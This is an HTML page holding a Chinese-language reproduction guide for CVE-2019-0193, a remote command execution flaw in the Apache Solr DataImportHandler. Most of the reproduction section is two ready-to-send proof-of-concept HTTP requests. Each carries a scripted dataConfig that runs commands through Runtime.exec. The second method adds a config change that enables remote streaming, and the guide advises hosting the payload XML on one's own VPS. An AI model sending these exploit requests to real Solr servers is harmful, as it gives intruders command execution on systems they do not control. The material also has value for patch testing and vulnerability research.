<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-0193apache-solr-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-0193</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Apache Solr </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Solr </span><span class="cs9C1B1871">是一个开源的搜索服务器。</span><span class="cs8926E06">Solr </span><span class="cs9C1B1871">使用</span><span class="cs8926E06"> Java </span><span class="cs9C1B1871">语言开发，主要基于</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Apache Lucene </span><span class="cs9C1B1871">实现。此次漏洞出现在</span><span class="cs8926E06">Apache Solr</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DataImportHandler</span><span class="cs9C1B1871">，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的</span><span class="cs8926E06">DIH</span><span class="cs9C1B1871">配置都可以通过外部请求的</span><span class="cs8926E06">dataConfig</span><span class="cs9C1B1871">参数来设置。由于</span><span class="cs8926E06">DIH</span><span class="cs9C1B1871">配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Solr &lt; 8.2.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="poc-一-需要目标出网支持低版本检测"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">一</span><span class="csD1E291E2"> </span><span class="csD6CA00D2">：需要目标出网，支持低版本检测</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">判断该索引库是否使用了</span><span class="cs8926E06">DataImportHandler</span><span class="cs9C1B1871">模块</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">http://www.0-sec.org:8983/solr/test_0nth3way/admin/mbeans?cat=QUERY&amp;wt=json</span></li><li class="cs24C36B3"><span class="cs9C1B1871">如果使用了</span><span class="cs9FB05234">DataImportHandler</span><span class="cs9C1B1871">模块</span><span class="cs8926E06"> </span><span class="cs9C1B1871">则</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">响应内会有</span><span class="cs8926E06">:</span><span class="cs9FB05234"> org.apache.solr.handler.dataimport.DataImportHandler</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">构造</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">请求，远程执行代码</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /solr/test_0nth3way/dataimport HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:8983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/json, text/plain, */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.17.136:8983/solr/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 1231</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test_0nth3way&amp;name=dataimport&amp;dataConfig=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;dataConfig&gt;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;script&gt;&lt;![CDATA[</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function poc(row){</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var result = [];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">while(true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var oneline = bufReader.readLine();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">result.push( oneline );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!oneline) break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">return row;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;]]&gt;&lt;/script&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;document&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;entity name=&quot;entity1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url=&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processor=&quot;XPathEntityProcessor&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;forEach=&quot;/RDF/item&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;transformer=&quot;script:poc&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/entity&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/document&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/dataConfig&gt;</span></p><p class="cs6FD73CFB"><span class="cs8926E06">demo.xml</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">若如上</span><span class="cs8926E06">github</span><span class="cs9C1B1871">因不可抗因素失效，可自行用自己</span><span class="cs8926E06">vps</span><span class="cs9C1B1871">搭建</span><span class="cs8926E06">demo.xml</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;RDF&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;item/&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/RDF&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><h3 class="cs868C439D">
			<a name="poc-二-不需要目标出网不支持低版本检测"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">二</span><span class="csD1E291E2"> </span><span class="csD6CA00D2">：不需要目标出网，不支持低版本检测</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">判断该索引库是否使用了</span><span class="cs9FB05234">DataImportHandler</span><span class="cs9C1B1871">模块（同上）</span></li><li class="cs24C36B3"><span class="cs9C1B1871">修改</span><span class="cs9FB05234">configoverlay.json</span><span class="cs9C1B1871">文件中的配置，以启用远程流的相关选项</span><span class="cs8926E06"> </span><span class="cs9C1B1871">（</span><span class="cs8926E06">enableStreamBody</span><span class="cs9C1B1871">、</span><span class="cs8926E06">enableRemoteStreaming</span><span class="cs9C1B1871">）</span><span class="cs8926E06"> </span><span class="cs9C1B1871">注：某些低版本会不成功，即响应</span><span class="cs8926E06">500</span><span class="cs9C1B1871">；成功响应</span><span class="cs8926E06">200</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /solr/test_0nth3way/config HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:8983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-type:application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 159</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">构造</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">请求，远程执行代码</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /solr/test_0nth3way/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test_0nth3way&amp;name=dataimport&amp;dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:8983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/json, text/plain, */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.17.136:8983/solr/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 212</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">--------------------------aceb88c2159f183f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;stream.body&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;RDF&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;item/&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/RDF&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">--------------------------aceb88c2159f183f--</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">注：其中</span><span class="cs8926E06">dataConfig</span><span class="cs9C1B1871">的值，</span><span class="cs8926E06">URLencode</span><span class="cs9C1B1871">之前为以下字符串</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;dataConfig&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;dataSource name=&quot;streamsrc&quot; type=&quot;ContentStreamDataSource&quot; loggerLevel=&quot;TRACE&quot; /&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&lt;script&gt;&lt;![CDATA[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function poc(row){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var result = [];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">while(true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var oneline = bufReader.readLine();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">result.push( oneline );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!oneline) break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">return row;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">]]&gt;&lt;/script&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;document&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;entity</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream=&quot;true&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name=&quot;entity1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;datasource=&quot;streamsrc1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processor=&quot;XPathEntityProcessor&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rootEntity=&quot;true&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;forEach=&quot;/RDF/item&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;transformer=&quot;script:poc&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/entity&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/document&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/dataConfig&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.png</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/0nth3way/p/11908763.html</span></p></body>
</html>
